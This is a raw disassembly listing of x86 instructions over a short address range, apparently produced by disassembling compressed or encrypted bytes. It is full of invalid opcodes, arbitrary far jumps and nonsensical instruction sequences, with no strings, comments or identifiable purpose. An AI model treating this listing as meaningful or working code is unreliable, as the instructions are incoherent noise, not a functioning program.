  41997c:	add    ebp,DWORD PTR [eax-0xed1a537]
  419982:	add    BYTE PTR [eax+0x5a],bl
  419985:	rol    DWORD PTR [esi-0x19],1
  419988:	mov    ebp,0xc480ec5e
  41998d:	xchg   ecx,eax
  41998e:	imul   edx,DWORD PTR [edi+edi*4-0x4a65c4f4],0x26
  419996:	addr16 add al,0xda
  419999:	pop    esp
  41999a:	mov    cl,0x61
  41999c:	je     0x41997c
  41999e:	stos   BYTE PTR es:[edi],al
  41999f:	sti    
  4199a0:	add    BYTE PTR es:[ecx-0x61],0x64
  4199a5:	jmp    0x4199f1
  4199a7:	(bad)  
  4199a8:	pop    ecx
  4199a9:	cmp    bh,cl
  4199ab:	enter  0x4d0e,0x1f
  4199af:	cmp    eax,0x6123ee28
  4199b4:	lock shl DWORD PTR [edx],1
  4199b7:	sub    eax,DWORD PTR ds:0x1ca7684e
  4199bd:	pop    ebp
  4199be:	cld    
  4199bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199c0:	jno    0x4199da
  4199c2:	nop
  4199c3:	lea    edx,[esi-0x60]
  4199c6:	push   es
  4199c7:	pop    edi
  4199c8:	out    0x4c,eax
  4199ca:	xchg   edi,eax
  4199cb:	scas   al,BYTE PTR es:[edi]
  4199cc:	stos   BYTE PTR es:[edi],al
  4199cd:	daa    
  4199ce:	aam    0x72
  4199d0:	adc    DWORD PTR [ebp-0x30dec4b9],edx
  4199d6:	push   edi
  4199d7:	sbb    ch,BYTE PTR ds:0x9e18210a
  4199dd:	and    BYTE PTR [edx-0x3c84da48],cl
  4199e3:	inc    esi
  4199e4:	dec    edi
  4199e5:	dec    ebx
  4199e6:	pop    edx
  4199e7:	jo     0x4199c5
  4199e9:	sbb    eax,DWORD PTR [edx+0xb]
  4199ec:	ret    
  4199ed:	dec    ebx
  4199ee:	stc    
  4199ef:	xchg   ebx,eax
  4199f0:	sub    esp,DWORD PTR [edx+0x107ef4b0]
  4199f6:	loopne 0x4199c3
  4199f8:	push   esp
  4199f9:	imul   eax,DWORD PTR [ecx-0x6fe6b690],0xffffff9b
  419a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a01:	repnz stos BYTE PTR es:[edi],al
  419a03:	jmp    0xed1e841b
  419a08:	mov    ebp,0xddbcf7bb
  419a0d:	nop
  419a0e:	adc    DWORD PTR [edi+0x29],0x0
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0x94c215d3
  419a81:	mov    WORD PTR [esi],?
  419a83:	dec    esp
  419a84:	or     eax,0x5000110
  419a89:	add    DWORD PTR [eax],eax
  419a8b:	add    dh,bl
  419a8d:	add    eax,0xeda1fd1f
  419a92:	(bad)  
  419a93:	mov    esp,esp
  419a95:	and    al,0x25
  419a97:	xchg   DWORD PTR [edi+0x55],ecx
  419a9a:	mov    bl,0xc0
  419a9c:	mov    eax,0xf6b57581
  419aa1:	push   0x504f0764
  419aa6:	loop   0x419a50
  419aa8:	daa    
  419aa9:	cmp    BYTE PTR [eax+0x2],0x43
  419aad:	test   al,bl
  419aaf:	dec    ebp
  419ab0:	aaa    
  419ab1:	jp     0x419afa
  419ab3:	mov    cl,0x5c
  419ab5:	ins    BYTE PTR es:[edi],dx
  419ab6:	push   eax
  419ab7:	jg     0x419a5e
  419ab9:	test   al,0xd7
  419abb:	mov    dh,0x56
  419abd:	xchg   ebx,eax
  419abe:	mov    ah,0xc1
  419ac0:	push   esp
  419ac1:	sub    BYTE PTR [esi],cl
  419ac3:	mov    edx,0x15a83f38
  419ac8:	inc    esp
  419ac9:	sbb    al,0xcf
  419acb:	push   cs
  419acc:	mov    ecx,0xa492db95
  419ad1:	rcr    DWORD PTR [esi+ecx*2+0x3c],cl
  419ad5:	xchg   esi,eax
  419ad6:	pop    ebp
  419ad7:	jo     0x419abe
  419ad9:	sub    edx,esi
  419adb:	jg     0x419ac2
  419add:	jl     0x419a84
  419adf:	nop
  419ae0:	xchg   DWORD PTR [ebp-0x393c0075],ecx
  419ae6:	sbb    eax,0x2936ded5
  419aeb:	repz mov bl,0x7a
  419aee:	dec    edi
  419aef:	test   eax,0xfa5e4157
  419af4:	xor    eax,0x58369b17
  419af9:	jp     0x419b3b
  419afb:	ds hlt 
  419afd:	cmp    dh,BYTE PTR ds:0x3c1f14f
  419b03:	(bad)  
  419b04:	js     0x419b08
  419b06:	dec    eax
  419b07:	sbb    al,BYTE PTR [edx]
  419b09:	(bad)  
  419b0a:	xchg   edi,eax
  419b0b:	rol    ah,cl
  419b0d:	(bad)  
  419b0e:	mov    esp,0x688344a7
  419b13:	sub    bl,bl
  419b15:	adc    al,0xfd
  419b17:	imul   ebp,DWORD PTR [edi+0x78],0x67
  419b1b:	dec    edi
  419b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b1d:	jbe    0x419aae
  419b1f:	or     eax,0xa3c70475
  419b24:	pop    ecx
  419b25:	push   ds
  419b26:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b28:	pop    DWORD PTR [eax+0x3a]
  419b2b:	jnp    0x419b36
  419b2d:	push   ebp
  419b2e:	rcl    dh,1
  419b30:	addr16 pushf 
  419b32:	push   eax
  419b33:	js     0x419b9c
  419b35:	jbe    0x419b35
  419b37:	mov    ds:0x21f4a2f9,eax
  419b3c:	icebp  
  419b3d:	jbe    0x419b3f
  419b3f:	stos   DWORD PTR es:[edi],eax
  419b40:	cmp    edx,DWORD PTR [esi+eiz*1+0x38d91e5e]
  419b47:	cmp    DWORD PTR [eax-0x7d64fe5f],ecx
  419b4d:	inc    ebx
  419b4e:	xchg   esp,eax
  419b4f:	enter  0x22e8,0x49
  419b53:	aad    0x47
  419b55:	pushf  
  419b56:	test   DWORD PTR [ecx+0xf],edx
  419b59:	aam    0xe6
  419b5b:	sub    dh,BYTE PTR [ecx]
  419b5d:	(bad)  
  419b5e:	mov    ds:0x2faf9004,eax
  419b63:	fiadd  WORD PTR [ebp-0x38]
  419b66:	test   DWORD PTR [ebx+0x3f352d8e],0x7237379c
  419b70:	pop    edi
  419b71:	imul   ecx,DWORD PTR [eax+0x7d],0xf
  419b75:	pusha  
  419b76:	mov    dl,0xdb
  419b78:	(bad)  
  419b79:	shr    BYTE PTR [ebp-0x44d63709],0xc
  419b80:	inc    esp
  419b81:	js     0x419b6f
  419b83:	add    eax,DWORD PTR [ebx+0x4e]
  419b86:	retf   
  419b87:	(bad)  
  419b88:	mov    edi,0xb37ff096
  419b8d:	inc    edi
  419b8e:	mov    DWORD PTR [ebx+0xe1],0x0
	...
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0xf
  419c01:	cmp    DWORD PTR [ecx],0x111125d
  419c07:	add    BYTE PTR ds:0xf9000001,al
  419c0d:	cs aas 
  419c0f:	dec    edx
  419c10:	stos   BYTE PTR es:[edi],al
  419c11:	xlat   BYTE PTR ds:[ebx]
  419c12:	mov    bl,0x36
  419c14:	test   eax,0x41b68227
  419c19:	(bad)  
  419c1a:	dec    ebx
  419c1b:	jge    0x419bc4
  419c1d:	mov    al,0xcc
  419c1f:	icebp  
  419c20:	dec    edi
  419c21:	jg     0x419c82
  419c23:	popa   
  419c24:	add    DWORD PTR [edx-0xc],0xd0854c4c
  419c2b:	pop    ss
  419c2c:	jne    0x419c10
  419c2e:	push   ebp
  419c30:	adc    al,0x35
  419c32:	jne    0x419ca1
  419c34:	ds loop 0x419c0a
  419c37:	pop    ebx
  419c38:	push   ds
  419c39:	clc    
  419c3a:	push   edx
  419c3b:	addr16 dec esi
  419c3d:	dec    edx
  419c3e:	icebp  
  419c3f:	imul   ebp,DWORD PTR [eax-0x6d964ed5],0x2270320f
  419c49:	mov    ebp,0x642313d2
  419c4e:	in     eax,dx
  419c4f:	sbb    eax,DWORD PTR [edi-0x2041df56]
  419c55:	shr    BYTE PTR [esi-0x32],0x4
  419c59:	es sti 
  419c5b:	jp     0x419cd3
  419c5d:	mov    eax,ds:0xa8f6ba51
  419c62:	sub    eax,0x69b134ea
  419c67:	mov    bh,0xdb
  419c69:	dec    ebp
  419c6a:	jno    0x419c03
  419c6c:	shl    ch,1
  419c6e:	sub    eax,0x6790686c
  419c73:	mov    al,ds:0x54fecb5b
  419c78:	mov    edx,0x25ecfc1f
  419c7d:	mov    eax,DWORD PTR [edx-0x51226093]
  419c83:	ds cmp esp,eax
  419c86:	dec    ebp
  419c87:	inc    ebp
  419c88:	mov    sp,0x6e44
  419c8c:	fadd   st(6),st
  419c8e:	fcomp  QWORD PTR [esi+0x2d]
  419c91:	push   cs
  419c92:	dec    edx
  419c93:	mov    cl,0xb3
  419c95:	push   0x5
  419c97:	dec    ecx
  419c98:	inc    edi
  419c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c9a:	adc    BYTE PTR [ebx],0x2
  419c9d:	pop    esp
  419c9e:	mov    BYTE PTR [ebp+ebx*8-0x57],dl
  419ca2:	push   0xab330cb
  419ca7:	shl    ecx,1
  419ca9:	loopne 0x419c3a
  419cab:	adc    eax,DWORD PTR [eax+0x36]
  419cae:	(bad)  [ecx-0x53]
  419cb1:	xchg   edi,eax
  419cb2:	loop   0x419d03
  419cb4:	in     al,dx
  419cb5:	loopne 0x419ccb
  419cb7:	sub    al,bl
  419cb9:	cmc    
  419cba:	ret    
  419cbb:	imul   eax,DWORD PTR [ebp+0x2a356ca4],0xe5107dda
  419cc5:	pop    ss
  419cc6:	(bad)  
  419cc7:	push   cs
  419cc8:	add    eax,0x257359d1
  419ccd:	adc    BYTE PTR [ecx-0x8],dl
  419cd0:	retf   0xc98f
  419cd3:	retf   
  419cd4:	fwait
  419cd5:	mov    edi,0xeb05f47a
  419cda:	xchg   ecx,eax
  419cdb:	dec    ecx
  419cdc:	rcl    esi,cl
  419cde:	pop    esp
  419cdf:	push   ebx
  419ce0:	fwait
  419ce1:	add    ah,BYTE PTR [edx-0x69a4fcba]
  419ce7:	imul   esp,DWORD PTR [esi+0xce1a53b],0x49
  419cee:	rcl    DWORD PTR [esi-0x6db4fc2a],0x52
  419cf5:	cmp    BYTE PTR [ebx+0x78],bh
  419cf8:	ret    0xc6d7
  419cfb:	iret   
  419cfc:	bound  eax,QWORD PTR [edx+0xf]
  419cff:	out    dx,al
  419d00:	jae    0x419cc4
  419d02:	xor    ebp,DWORD PTR [edi+0x3d8569b1]
  419d08:	test   BYTE PTR [esi+0x65],ch
  419d0b:	dec    edx
  419d0c:	jb     0x419d1a
  419d0e:	jns    0x419d31
  419d10:	xor    eax,DWORD PTR [eax]
	...
  419d72:	add    BYTE PTR [eax],al
  419d74:	lock xchg edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fidiv  DWORD PTR ss:[edx+0x4e]
  419d82:	dec    ebx
  419d83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d84:	pop    ss
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0xa5000001,al
  419d8d:	in     al,dx
  419d8e:	(bad)  
  419d8f:	nop
  419d90:	jle    0x419d6c
  419d92:	jl     0x419da1
  419d94:	push   es
  419d95:	sub    DWORD PTR [edx+0x2c34b816],eax
  419d9b:	aaa    
  419d9c:	and    DWORD PTR [eax+edi*4-0x14226664],ebx
  419da3:	jno    0x419e13
  419da5:	repz add BYTE PTR [edx],dh
  419da8:	add    DWORD PTR [edx+0x4b],edx
  419dab:	test   al,0x7e
  419dad:	inc    eax
  419dae:	in     al,0xa7
  419db0:	pop    ds
  419db1:	dec    esi
  419db2:	inc    edi
  419db3:	fwait
  419db4:	jns    0x419d9c
  419db6:	ins    DWORD PTR es:[edi],dx
  419db7:	sbb    eax,0x7864a0f3
  419dbc:	cwde   
  419dbd:	push   ebx
  419dbe:	push   0xffffffd8
  419dc0:	fst    QWORD PTR [edi+0x1a]
  419dc3:	mov    bh,0x64
  419dc5:	fdiv   DWORD PTR [edi-0x53fa27fb]
  419dcb:	fldenv [esi+0x1d3906b6]
  419dd1:	push   edx
  419dd2:	mov    ds:0x90bc88b,al
  419dd7:	add    BYTE PTR [edx+eiz*4-0x3a15545],dh
  419dde:	cwde   
  419ddf:	xchg   BYTE PTR [edi],ah
  419de1:	pop    ecx
  419de2:	rcr    bh,cl
  419de4:	or     bl,BYTE PTR [eax]
  419de6:	mov    ss,WORD PTR ds:0x9a37dfda
  419dec:	loopne 0x419e01
  419dee:	bound  esi,QWORD PTR [edx]
  419df0:	pop    ecx
  419df1:	pop    ecx
  419df2:	dec    ecx
  419df3:	aad    0xb1
  419df5:	inc    eax
  419df6:	pop    ds
  419df7:	pop    edx
  419df8:	test   BYTE PTR [esi+0x16],al
  419dfb:	sub    BYTE PTR [eax+edx*8-0xc],cl
  419dff:	xchg   ebp,eax
  419e00:	xor    al,BYTE PTR [esi-0x47]
  419e03:	jnp    0x419e3c
  419e05:	std    
  419e06:	xchg   edx,eax
  419e07:	stc    
  419e08:	addr16 push edx
  419e0a:	lock stc 
  419e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e0d:	xor    dl,BYTE PTR [esi+esi*4+0x6f7cc429]
  419e14:	test   ebx,edx
  419e16:	push   ebx
  419e17:	std    
  419e18:	sbb    DWORD PTR [eax+0x752dc266],ebp
  419e1e:	xchg   ebx,eax
  419e1f:	pop    edi
  419e20:	and    esp,DWORD PTR [edx]
  419e22:	jne    0x419db8
  419e24:	stos   BYTE PTR es:[edi],al
  419e25:	fbstp  TBYTE PTR [ebp+0x77]
  419e28:	and    eax,0xc0079fc6
  419e2d:	loop   0x419e23
  419e2f:	cld    
  419e30:	push   ds
  419e31:	xlat   BYTE PTR ds:[ebx]
  419e32:	pop    ebx
  419e33:	jmp    0x419e52
  419e35:	fdivp  st(5),st
  419e37:	ror    DWORD PTR [edx+0x798e36c9],0x58
  419e3e:	add    ah,BYTE PTR [esi+0x50]
  419e41:	repz xor ecx,DWORD PTR [ecx+0x303bec50]
  419e48:	mov    dl,0xbf
  419e4a:	mov    es,WORD PTR [esi+0x5f87942d]
  419e50:	sar    DWORD PTR [eax-0x1a],0x3d
  419e54:	cmp    dl,BYTE PTR [ecx]
  419e56:	(bad)  
  419e57:	scas   al,BYTE PTR es:[edi]
  419e58:	mov    eax,0x234973ae
  419e5d:	aam    0xd3
  419e5f:	les    ecx,FWORD PTR [ecx-0x17d7f0af]
  419e65:	int    0x8
  419e67:	xor    al,0xb3
  419e69:	mov    edx,0x44898e46
  419e6e:	pop    ds
  419e6f:	inc    ecx
  419e70:	push   ebp
  419e71:	ret    
  419e72:	sub    BYTE PTR [ebp+0x1],dh
  419e75:	in     al,dx
  419e76:	xchg   bh,al
  419e78:	out    0xb4,eax
  419e7a:	jb     0x419e0f
  419e7c:	bound  ebx,QWORD PTR [edi-0x725b1f7f]
  419e82:	pop    ss
  419e83:	fld    TBYTE PTR [ebx]
  419e85:	jmp    0x419eb9
  419e87:	cmp    eax,0xe3449d40
  419e8c:	fisttp WORD PTR [ecx+0xdaa487]
	...
  419ef2:	add    BYTE PTR [eax],al
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	dec    BYTE PTR [edx-0x1]
  419f03:	xor    bl,BYTE PTR [ebx+edx*1]
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    eax,0x8c000001
  419f0d:	sar    bl,cl
  419f0f:	stos   BYTE PTR es:[edi],al
  419f10:	call   0xc992:0x7feaf157
  419f17:	sub    eax,0xc053e9de
  419f1c:	test   BYTE PTR [edx],bl
  419f1e:	add    ebx,DWORD PTR [esi]
  419f20:	ret    0x96ac
  419f23:	or     eax,0x5a61ced7
  419f28:	ja     0x419f2f
  419f2a:	and    cl,BYTE PTR [esp+ebx*4-0x4473a7d4]
  419f31:	(bad)  
  419f32:	scas   al,BYTE PTR es:[edi]
  419f33:	ins    BYTE PTR es:[edi],dx
  419f34:	call   0x3dacc8ee
  419f39:	jb     0x419fb9
  419f3b:	pop    edi
  419f3c:	mov    al,ds:0x7732ed27
  419f41:	xchg   edi,eax
  419f42:	sbb    eax,0x53556a70
  419f47:	mov    eax,fs:0x3f9d317a
  419f4d:	iret   
  419f4e:	repz pop esi
  419f50:	icebp  
  419f51:	and    edx,0xffffffa9
  419f54:	and    DWORD PTR [eax+0xdf5b36c],eax
  419f5a:	push   ss
  419f5b:	int3   
  419f5c:	lahf   
  419f5d:	cs lahf 
  419f5f:	ret    0x9733
  419f62:	mov    eax,0x74da59e8
  419f67:	stos   DWORD PTR es:[edi],eax
  419f68:	dec    eax
  419f69:	sti    
  419f6a:	pop    edi
  419f6b:	add    al,0xda
  419f6d:	leave  
  419f6e:	xor    eax,0x4bb5da89
  419f73:	xchg   ecx,eax
  419f74:	add    DWORD PTR [ecx-0x3],edx
  419f77:	inc    edx
  419f78:	push   cs
  419f79:	mov    BYTE PTR [eax],ch
  419f7b:	mov    bh,0x5d
  419f7d:	dec    edx
  419f7e:	out    0x5e,al
  419f80:	push   edx
  419f81:	sar    eax,cl
  419f83:	or     ecx,edi
  419f85:	inc    ebx
  419f86:	int    0xa9
  419f88:	xor    BYTE PTR [ecx-0x40],ch
  419f8b:	xlat   BYTE PTR ds:[ebx]
  419f8c:	gs inc ebx
  419f8e:	push   0xfffffff9
  419f90:	xor    DWORD PTR [ecx+0x59],0x51b13103
  419f97:	dec    esp
  419f98:	stc    
  419f99:	cdq    
  419f9a:	fs inc esi
  419f9c:	sub    eax,0x93faae65
  419fa1:	mov    BYTE PTR [ebp-0x73],ch
  419fa4:	(bad)  
  419fa5:	mov    ds,WORD PTR [edi]
  419fa7:	fld    QWORD PTR [edi+0x2d772c6f]
  419fad:	jnp    0x419fba
  419faf:	add    al,0xdd
  419fb1:	dec    esi
  419fb2:	scas   al,BYTE PTR es:[edi]
  419fb3:	adc    ebp,DWORD PTR [ecx+0x55]
  419fb6:	cmp    ebp,DWORD PTR [ebp+esi*4+0x6b0dd9ae]
  419fbd:	pusha  
  419fbe:	jecxz  0x419fc7
  419fc0:	sbb    al,0x9d
  419fc2:	sub    BYTE PTR [eax-0x70],al
  419fc5:	shl    BYTE PTR [edx+0x2c],cl
  419fc8:	sbb    eax,0x47782dc1
  419fcd:	in     eax,dx
  419fce:	retf   0x7c96
  419fd1:	dec    eax
  419fd2:	loope  0x419f93
  419fd4:	push   eax
  419fd5:	mov    dh,0xeb
  419fd7:	ds js  0x419fa2
  419fda:	out    0x47,eax
  419fdc:	adc    edi,DWORD PTR ds:0xa0064b5
  419fe2:	ret    
  419fe3:	jbe    0x419f87
  419fe5:	in     al,dx
  419fe6:	fst    DWORD PTR [edx]
  419fe8:	dec    esp
  419fe9:	(bad)  
  419fea:	icebp  
  419feb:	xchg   BYTE PTR [edi-0x796adf7f],ch
  419ff1:	add    edx,DWORD PTR [edi]
  419ff3:	addr16 addr16 in eax,0x90
  419ff7:	xor    eax,0x969ccc06
  419ffc:	xchg   BYTE PTR [edx+edx*1+0x23],dh
  41a000:	inc    esi
  41a001:	loop   0x41a07f
  41a003:	jno    0x41a082
  41a005:	and    edx,DWORD PTR [ebp-0x6c]
  41a008:	push   ss
  41a009:	div    bl
  41a00b:	xchg   cl,bh
  41a00d:	jns    0x41a055
  41a00f:	xchg   BYTE PTR [ebx+0x0],bl
	...
  41a072:	add    BYTE PTR [eax],al
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x1],bh
  41a081:	jne    0x41a083
  41a083:	mov    al,0x21
  41a085:	adc    al,0x1
  41a087:	add    BYTE PTR ds:0x9e000001,al
  41a08d:	cmp    dl,BYTE PTR [ecx-0x8]
  41a090:	aas    
  41a091:	xchg   esp,eax
  41a092:	or     DWORD PTR [edi+ebx*1+0xb],ecx
  41a096:	fcom   DWORD PTR [ecx+0xaa897ca]
  41a09c:	push   edi
  41a09d:	fcomp  QWORD PTR [ebx+0x47]
  41a0a0:	fimul  DWORD PTR [eax-0x2ef58564]
  41a0a6:	jbe    0x41a123
  41a0a8:	ins    BYTE PTR es:[edi],dx
  41a0a9:	mov    ebp,0x6bbb7cf5
  41a0ae:	mov    dl,0x5d
  41a0b0:	jl     0x41a06e
  41a0b2:	mov    ebp,esi
  41a0b4:	in     eax,dx
  41a0b5:	jmp    0x348d:0x51bb031
  41a0bc:	enter  0x11f7,0xd4
  41a0c0:	mov    bl,0x45
  41a0c2:	js     0x41a046
  41a0c4:	dec    edi
  41a0c5:	setns  BYTE PTR [edx]
  41a0c8:	add    dl,dl
  41a0ca:	jge    0x41a13c
  41a0cc:	xchg   edi,eax
  41a0cd:	lods   al,BYTE PTR ds:[esi]
  41a0ce:	mov    DWORD PTR [eax],esi
  41a0d0:	stos   BYTE PTR es:[edi],al
  41a0d1:	mov    bh,0xc5
  41a0d3:	(bad)  
  41a0d4:	iret   
  41a0d5:	mov    eax,DWORD PTR [edi+0x74]
  41a0d8:	adc    al,0xfc
  41a0da:	es fwait
  41a0dc:	test   DWORD PTR [ecx+ecx*1],0xf2d4530a
  41a0e3:	retf   0x6b61
  41a0e6:	test   al,0x5b
  41a0e8:	mov    esi,DWORD PTR [eax+0x78]
  41a0eb:	push   eax
  41a0ec:	add    ebp,DWORD PTR ds:0xfa7058c
  41a0f2:	xchg   edx,eax
  41a0f3:	jmp    0x41a0b7
  41a0f5:	adc    BYTE PTR [ebx],ch
  41a0f7:	xor    eax,0xec7aedd5
  41a0fc:	ja     0x41a172
  41a0fe:	outs   dx,DWORD PTR ds:[esi]
  41a0ff:	push   ds
  41a100:	data16 mov al,0xee
  41a103:	sti    
  41a104:	jl     0x41a12d
  41a106:	xchg   ecx,eax
  41a107:	(bad)  [edx+eax*4+0x1989a967]
  41a10e:	ins    BYTE PTR es:[edi],dx
  41a10f:	push   cs
  41a110:	add    BYTE PTR [ebp-0x51e17e18],dl
  41a116:	(bad)  [ecx-0x115727d7]
  41a11c:	shr    BYTE PTR [ebx-0x12],cl
  41a11f:	jle    0x41a164
  41a121:	data16 fs jns 0x41a0bb
  41a125:	rcr    BYTE PTR es:[ebx+ebx*4+0x4d],1
  41a12a:	rcr    DWORD PTR [esi],cl
  41a12c:	add    al,0xcc
  41a12e:	inc    ecx
  41a12f:	xchg   esp,eax
  41a130:	loopne 0x41a10d
  41a132:	pop    esp
  41a133:	push   cs
  41a134:	mov    bl,0xaf
  41a136:	(bad)
  41a139:	add    BYTE PTR [eax-0x5a5610be],al
  41a13f:	jp     0x41a193
  41a141:	mov    eax,ds:0x2a068853
  41a146:	frstor [edi+0x7e0d1849]
  41a14c:	aam    0x28
  41a14e:	cmp    edi,DWORD PTR [eax]
  41a150:	ins    DWORD PTR es:[edi],dx
  41a151:	outs   dx,DWORD PTR ds:[esi]
  41a152:	adc    DWORD PTR [edi+esi*8-0x5c],esi
  41a156:	test   al,0x4f
  41a158:	pushf  
  41a159:	pop    eax
  41a15a:	dec    esi
  41a15b:	jmp    0xed99785a
  41a160:	nop
  41a161:	mov    al,BYTE PTR [eax-0x669b968b]
  41a167:	iret   
  41a168:	retf   0x1aaf
  41a16b:	sbb    al,0x72
  41a16d:	xchg   edi,eax
  41a16e:	sub    BYTE PTR [ecx*4+0x1574be48],0xb6
  41a176:	cmc    
  41a177:	scas   eax,DWORD PTR es:[edi]
  41a178:	jns    0x41a1c3
  41a17a:	inc    ecx
  41a17b:	pop    esi
  41a17c:	push   ss
  41a17d:	cld    
  41a17e:	cwde   
  41a17f:	xchg   ebp,eax
  41a180:	fdiv   QWORD PTR [ebx-0x4e]
  41a183:	jmp    0xea2c:0xc4d4a2ee
  41a18a:	dec    ecx
  41a18b:	mov    ch,0x7f
  41a18d:	call   0x0:0x7e5657
	...
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	inc    edx
  41a201:	mov    edi,0x15262fdc
  41a206:	add    DWORD PTR [eax],eax
  41a208:	add    eax,0x19000001
  41a20d:	std    
  41a20e:	push   cs
  41a20f:	fs rcl BYTE PTR fs:[edx+0x3e7ca696],1
  41a217:	mov    ebp,0x9fe7e333
  41a21c:	sub    al,bl
  41a21e:	or     DWORD PTR [esi+0x4b37d27b],esp
  41a224:	(bad)  
  41a225:	aad    0xcb
  41a227:	lods   al,BYTE PTR ds:[esi]
  41a228:	jge    0x41a250
  41a22a:	aad    0x69
  41a22c:	push   esp
  41a22d:	fidiv  WORD PTR ds:0xca3b3527
  41a233:	mov    bh,0xa1
  41a235:	shr    DWORD PTR [ecx-0x41f7a8ea],cl
  41a23b:	leave  
  41a23c:	mov    WORD PTR [eiz*8+0x704ac0c0],gs
  41a243:	jge    0x41a25d
  41a245:	rcl    BYTE PTR [ebp*8-0x2c22bf6b],0xad
  41a24d:	stc    
  41a24e:	adc    ah,BYTE PTR [edx]
  41a250:	std    
  41a251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a252:	aaa    
  41a253:	jbe    0x41a24d
  41a255:	mov    bl,0x72
  41a257:	clc    
  41a258:	daa    
  41a259:	adc    al,0x94
  41a25b:	in     al,0x59
  41a25d:	inc    edx
  41a25e:	push   DWORD PTR [eax]
  41a260:	cdq    
  41a261:	sbb    eax,0x57b88410
  41a266:	adc    edi,edx
  41a268:	sbb    eax,0x85b36bf0
  41a26d:	mov    ecx,ss
  41a26f:	fwait
  41a270:	loop   0x41a296
  41a272:	push   ebp
  41a273:	mov    al,ds:0x19af3282
  41a278:	mov    edx,es
  41a27a:	jnp    0x41a2a3
  41a27c:	and    BYTE PTR [ebp+0x6c3434f2],ch
  41a282:	mov    bl,0x24
  41a284:	adc    BYTE PTR [ecx],cl
  41a286:	mov    ebx,0xd7ce0255
  41a28b:	sti    
  41a28c:	xchg   al,bl
  41a28e:	int    0x6c
  41a290:	mov    ch,0x4d
  41a292:	in     al,0x7a
  41a294:	call   0xd095:0x164623ff
  41a29b:	call   0xaa3d:0x2e6e6a72
  41a2a2:	mov    dh,0x61
  41a2a4:	jns    0x41a2be
  41a2a6:	inc    esp
  41a2a7:	jbe    0x41a30b
  41a2a9:	xchg   esi,eax
  41a2aa:	fdivr  st,st(3)
  41a2ac:	pushf  
  41a2ad:	inc    eax
  41a2ae:	or     bh,BYTE PTR [ecx]
  41a2b0:	fist   DWORD PTR [esi+0x464f510]
  41a2b6:	mov    esp,0x2cb40d84
  41a2bb:	inc    ecx
  41a2bc:	cmp    al,BYTE PTR [esp+eax*8]
  41a2bf:	bound  edi,QWORD PTR [edx-0x4b]
  41a2c2:	pusha  
  41a2c3:	repnz push esp
  41a2c5:	call   0x65b4d260
  41a2ca:	ja     0x41a291
  41a2cc:	pop    ss
  41a2cd:	fld    DWORD PTR [ecx+0xd]
  41a2d0:	dec    esi
  41a2d1:	mov    dh,0xb4
  41a2d3:	and    DWORD PTR [ebx],edi
  41a2d5:	mov    esp,DWORD PTR [edi]
  41a2d7:	xor    dh,BYTE PTR [ebx+0x4b]
  41a2da:	inc    ebx
  41a2db:	and    eax,0xb9b77bfc
  41a2e0:	cs pop ebp
  41a2e2:	lds    esi,FWORD PTR [edx-0x4de62a14]
  41a2e8:	mov    bl,0x93
  41a2ea:	scas   al,BYTE PTR es:[edi]
  41a2eb:	sub    esi,0xba7611e9
  41a2f1:	add    BYTE PTR [edx+0x4cfa979f],al
  41a2f7:	and    eax,0xa8c25cc4
  41a2fc:	cmp    esi,0x95921243
  41a302:	jle    0x41a328
  41a304:	push   esi
  41a305:	into   
  41a306:	and    al,0x52
  41a308:	jns    0x41a2b4
  41a30a:	sub    dl,0xf0
  41a30d:	mov    edi,0x3f7008
	...
  41a372:	add    BYTE PTR [eax],al
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	fcom   st(1)
  41a382:	and    dl,dl
  41a384:	sub    edx,DWORD PTR [esi]
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0x93000001
  41a38d:	out    dx,al
  41a38e:	xor    DWORD PTR [ecx-0x26e7b334],esi
  41a394:	sub    eax,0x62fcdc4c
  41a399:	mov    edi,DWORD PTR [esi]
  41a39b:	pop    es
  41a39c:	jg     0x41a3ad
  41a39e:	jnp    0x41a336
  41a3a0:	cmp    eax,0xe3f137f2
  41a3a5:	cmp    eax,0x1acdd712
  41a3aa:	fcomp  QWORD PTR [ebx-0x1f1a66da]
  41a3b0:	call   0x8768:0x32e95f0e
  41a3b7:	js     0x41a436
  41a3b9:	rcr    BYTE PTR [ecx],cl
  41a3bb:	jns    0x41a402
  41a3bd:	popf   
  41a3be:	mov    dh,0x32
  41a3c0:	loope  0x41a3ea
  41a3c2:	jg     0x41a3f2
